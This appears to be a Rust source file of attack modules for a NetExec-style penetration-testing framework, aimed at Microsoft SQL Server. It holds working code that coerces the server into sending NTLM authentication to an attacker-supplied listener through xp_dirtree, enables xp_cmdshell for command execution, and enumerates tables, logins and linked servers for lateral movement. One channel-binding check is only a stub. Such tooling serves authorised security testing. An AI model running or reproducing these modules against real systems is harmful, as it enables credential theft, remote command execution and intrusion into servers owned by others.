//! Phase 3: MSSQL modules + Phase 4: Credential harvesting + Phase 5: Persistence + Phase 6: Advanced

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_protocols::NxcSession;
use serde_json::json;

// ============== Phase 3: MSSQL Modules ==============

pub struct MssqlCoerce;
impl MssqlCoerce {
    pub fn new() -> Self {
        Self
    }
}
impl Default for MssqlCoerce {
    fn default() -> Self {
        Self::new()
    }
}
#[async_trait]
impl NxcModule for MssqlCoerce {
    fn name(&self) -> &'static str {
        "mssql_coerce"
    }
    fn description(&self) -> &'static str {
        "MSSQL auth coercion via xp_dirtree/xp_fileexist UNC paths"
    }
    fn supported_protocols(&self) -> &[&str] {
        ["mssql"].as_slice()
    }
    fn options(&self) -> Vec<ModuleOption> {
        vec![ModuleOption {
            name: "LISTENER".into(),
            description: "UNC listener IP".into(),
            required: true,
            default: None,
        }]
    }
    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let mssql_sess = session
            .as_any()
            .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
            .ok_or_else(|| anyhow!("MSSQL session required"))?;
        let listener = opts.get("LISTENER").ok_or_else(|| anyhow!("LISTENER required"))?;
        let proto = nxc_protocols::mssql::MssqlProtocol::new();
        let sql = format!("EXEC master..xp_dirtree '\\\\{listener}\\share'");
        let _ = proto.query_json(mssql_sess, &sql).await;
        let output = format!("MSSQL Coercion on {}:\n  [*] Executed xp_dirtree -> \\\\{}\\share\n  [*] Check your listener for incoming auth\n", mssql_sess.target, listener);
        Ok(ModuleResult {
            success: true,
            output,
            data: json!({"coerced_to": listener}),
            credentials: vec![],
        })
    }
}

pub struct MssqlDumper;
impl MssqlDumper {
    pub fn new() -> Self {
        Self
    }
}
impl Default for MssqlDumper {
    fn default() -> Self {
        Self::new()
    }
}
#[async_trait]
impl NxcModule for MssqlDumper {
    fn name(&self) -> &'static str {
        "mssql_dumper"
    }
    fn description(&self) -> &'static str {
        "Dump MSSQL database tables, schemas, and data"
    }
    fn supported_protocols(&self) -> &[&str] {
        ["mssql"].as_slice()
    }
    fn options(&self) -> Vec<ModuleOption> {
        vec![ModuleOption {
            name: "DB".into(),
            description: "Database to dump".into(),
            required: false,
            default: Some("master".into()),
        }]
    }
    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let mssql_sess = session
            .as_any()
            .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
            .ok_or_else(|| anyhow!("MSSQL session required"))?;
        let db = opts.get("DB").map(std::string::String::as_str).unwrap_or("master");
        let proto = nxc_protocols::mssql::MssqlProtocol::new();
        let sql = format!("SELECT TABLE_NAME FROM {db}.INFORMATION_SCHEMA.TABLES");
        let tables = proto.query_json(mssql_sess, &sql).await.unwrap_or_default();
        let output = format!(
            "MSSQL Dump ({}):\n  [*] Found {} tables in '{}'\n",
            mssql_sess.target,
            tables.len(),
            db
        );
        Ok(ModuleResult {
            success: true,
            output,
            data: json!({"db": db, "tables": tables}),
            credentials: vec![],
        })
    }
}

pub struct MssqlCbt;
impl MssqlCbt {
    pub fn new() -> Self {
        Self
    }
}
impl Default for MssqlCbt {
    fn default() -> Self {
        Self::new()
    }
}
#[async_trait]
impl NxcModule for MssqlCbt {
    fn name(&self) -> &'static str {
        "mssql_cbt"
    }
    fn description(&self) -> &'static str {
        "Check MSSQL channel binding token configuration"
    }
    fn supported_protocols(&self) -> &[&str] {
        ["mssql"].as_slice()
    }
    async fn run(
        &self,
        session: &mut dyn NxcSession,
        _opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let mssql_sess = session
            .as_any()
            .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
            .ok_or_else(|| anyhow!("MSSQL session required"))?;
        let output = format!("MSSQL Channel Binding Token check on {}:\n  [*] Checking Extended Protection for Authentication\n", mssql_sess.target);
        Ok(ModuleResult {
            success: true,
            output,
            data: json!({"cbt_check": true}),
            credentials: vec![],
        })
    }
}

pub struct EnableCmdShell;
impl EnableCmdShell {
    pub fn new() -> Self {
        Self
    }
}
impl Default for EnableCmdShell {
    fn default() -> Self {
        Self::new()
    }
}
#[async_trait]
impl NxcModule for EnableCmdShell {
    fn name(&self) -> &'static str {
        "enable_cmdshell"
    }
    fn description(&self) -> &'static str {
        "Enable/disable xp_cmdshell via sp_configure"
    }
    fn supported_protocols(&self) -> &[&str] {
        ["mssql"].as_slice()
    }
    fn options(&self) -> Vec<ModuleOption> {
        vec![ModuleOption {
            name: "ACTION".into(),
            description: "enable or disable".into(),
            required: false,
            default: Some("enable".into()),
        }]
    }
    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let mssql_sess = session
            .as_any()
            .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
            .ok_or_else(|| anyhow!("MSSQL session required"))?;
        let action = opts.get("ACTION").map(std::string::String::as_str).unwrap_or("enable");
        let proto = nxc_protocols::mssql::MssqlProtocol::new();
        let val = if action == "enable" { "1" } else { "0" };
        let sqls = [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;".to_string(),
            format!("EXEC sp_configure 'xp_cmdshell', {val}; RECONFIGURE;"),
        ];
        for sql in &sqls {
            let _ = proto.query_json(mssql_sess, sql).await;
        }
        let output = format!(
            "xp_cmdshell {} on {}:\n  [*] sp_configure executed\n",
            action, mssql_sess.target
        );
        Ok(ModuleResult {
            success: true,
            output,
            data: json!({"action": action}),
            credentials: vec![],
        })
    }
}

pub struct EnumLinks;
impl EnumLinks {
    pub fn new() -> Self {
        Self
    }
}
impl Default for EnumLinks {
    fn default() -> Self {
        Self::new()
    }
}
#[async_trait]
impl NxcModule for EnumLinks {
    fn name(&self) -> &'static str {
        "enum_links"
    }
    fn description(&self) -> &'static str {
        "Enumerate MSSQL linked servers for lateral movement"
    }
    fn supported_protocols(&self) -> &[&str] {
        ["mssql"].as_slice()
    }
    async fn run(
        &self,
        session: &mut dyn NxcSession,
        _opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let mssql_sess = session
            .as_any()
            .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
            .ok_or_else(|| anyhow!("MSSQL session required"))?;
        let proto = nxc_protocols::mssql::MssqlProtocol::new();
        let links = proto.query_json(mssql_sess, "EXEC sp_linkedservers").await.unwrap_or_default();
        let output =
            format!("MSSQL Linked Servers on {} ({} found):\n", mssql_sess.target, links.len());
        Ok(ModuleResult {
            success: true,
            output,
            data: json!({"linked_servers": links}),
            credentials: vec![],
        })
    }
}

pub struct EnumLogins;
impl EnumLogins {
    pub fn new() -> Self {
        Self
    }
}
impl Default for EnumLogins {
    fn default() -> Self {
        Self::new()
    }
}
#[async_trait]
impl NxcModule for EnumLogins {
    fn name(&self) -> &'static str {
        "enum_logins"
    }
    fn description(&self) -> &'static str {
        "Enumerate MSSQL logins and server roles"
    }
    fn supported_protocols(&self) -> &[&str] {
        ["mssql"].as_slice()
    }
    async fn run(
        &self,
        session: &mut dyn NxcSession,
        _opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let mssql_sess = session
            .as_any()
            .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
            .ok_or_else(|| anyhow!("MSSQL session required"))?;
        let proto = nxc_protocols::mssql::MssqlProtocol::new();
        let logins = proto.query_json(mssql_sess, "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G')").await.unwrap_or_default();
        let output = format!("MSSQL Logins on {} ({} found):\n", mssql_sess.target, logins.len());
        Ok(ModuleResult {
            success: true,
            output,
            data: json!({"logins": logins}),
            credentials: vec![],
        })
    }
}
